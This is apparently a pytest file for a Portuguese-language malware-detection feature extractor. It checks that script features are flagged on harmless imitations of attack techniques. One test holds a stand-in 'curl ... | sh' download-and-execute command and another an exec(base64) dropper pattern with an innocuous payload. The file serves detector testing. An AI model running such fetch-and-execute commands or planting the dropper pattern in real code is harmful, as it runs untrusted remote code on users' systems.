"""Caracteristicas de scripts: tecnicas imitadas com conteudo inofensivo."""
import base64
import random
import time

import pytest

from mandacaru.ml.features import SCRIPT_FEATURE_NAMES, extract, extract_script


def feat(kind, data):
    return dict(zip(SCRIPT_FEATURE_NAMES, extract_script(kind, data), strict=True))


def test_um_valor_por_nome():
    assert len(extract_script("sh", b"echo oi\n")) == len(SCRIPT_FEATURE_NAMES) == len(set(SCRIPT_FEATURE_NAMES))


def test_dropper_imitado():
    payload = base64.b64encode(b"print('inofensivo')" * 10).decode()
    f = feat("python", f"import base64\nexec(base64.b64decode('{payload}'))\n".encode())
    assert f["tipo_python"] == 1 and f["exec_dinamico"] >= 1 and f["decodificacao"] >= 1 and f["blocos_b64"] == 1


def test_baixa_e_executa():
    f = feat("sh", b"#!/bin/sh\ncurl -s http://exemplo.invalid/x | sh\n")
    assert f["baixa_e_executa"] == 1 and f["tem_shebang"] == 1 and f["urls"] == 1
    assert feat("sh", b"#!/bin/sh\ncurl -s http://exemplo.invalid/x -o x\n")["baixa_e_executa"] == 0


def test_shebang_seguido_de_binario_nao_levanta():
    f = feat("sh", b"#!/bin/sh\n" + bytes(range(256)) * 20)
    assert f["tipo_sh"] == 1


def test_linha_unica_gigante_dentro_do_orcamento():
    data = b"var a=" + b"x" * (1024 * 1024) + b";"
    t = time.perf_counter()
    f = feat("js", data)
    assert time.perf_counter() - t < 0.25 and f["maior_linha_log2"] <= 21


def test_entradas_aleatorias_nunca_levantam():
    rnd = random.Random(11)
    for _ in range(2000):
        data = bytes(rnd.getrandbits(8) for _ in range(rnd.randrange(0, 4096)))
        assert len(extract_script("sh", data)) == len(SCRIPT_FEATURE_NAMES)


def test_extract_despacha_por_tipo():
    assert extract("perl", b"my $x = 1;\n") == extract_script("perl", b"my $x = 1;\n")
    with pytest.raises(ValueError):
        extract("pdf", b"%PDF")
